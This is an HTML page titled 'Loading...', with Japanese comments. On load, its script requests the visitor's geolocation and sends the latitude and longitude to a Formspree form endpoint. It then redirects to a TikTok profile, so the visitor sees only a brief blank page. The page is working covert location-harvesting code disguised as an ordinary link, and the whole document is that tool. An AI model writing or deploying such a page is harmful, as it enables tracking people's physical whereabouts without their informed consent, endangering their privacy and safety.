<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
            } else {
                redirectNow(); // 位置情報が取得できない場合も即リダイレクト
            }
        }

        function sendLocation(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;

            // 位置情報を送信（FormspreeのURLに変更）
            fetch("https://formspree.io/f/mvgkwpzg", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ latitude: lat, longitude: lon })
            }).finally(redirectNow); // 送信後にリダイレクト
        }

        function redirectNow() {
            window.location.replace("https://www.tiktok.com/@kaga1024?is_from_webapp=1&sender_device=pc"); // リダイレクト先のURL
        }

        // ページが読み込まれるとすぐに位置情報取得を開始
        getLocation();
    </script>
</head>
<body>
</body>
</html>
